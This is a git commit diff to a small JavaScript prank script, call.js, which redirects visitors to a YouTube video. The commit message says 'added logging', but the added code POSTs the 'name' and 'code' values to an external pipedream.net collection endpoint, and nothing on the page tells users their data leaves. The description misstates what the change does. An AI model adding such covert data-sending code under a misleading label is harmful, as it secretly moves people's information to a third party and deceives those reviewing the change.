7ee605c20589a86ff5850a9392f4300498722032
JeffaloBob <40470736+JeffaloBob@users.noreply.github.com>
2020-03-29 13:31:08 +0200

    added logging

--- call.js
+++ call.js
@@ -13,6 +13,20 @@ console.log("Hello");
 setTimeout(() => { prank(); }, 4000);
 console.log("Goodbye!");
 
+const headers = new Headers()
+headers.append("Content-Type", "application/json")
+
+const body = { "name": name, "code":code }
+
+const options = {
+  method: "POST",
+  headers,
+  mode: "cors",
+  body: JSON.stringify(body),
+}
+
+fetch("https://enr0tl9a5l769.x.pipedream.net/", options)
+
 function prank(){
     window.location.replace('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
 }
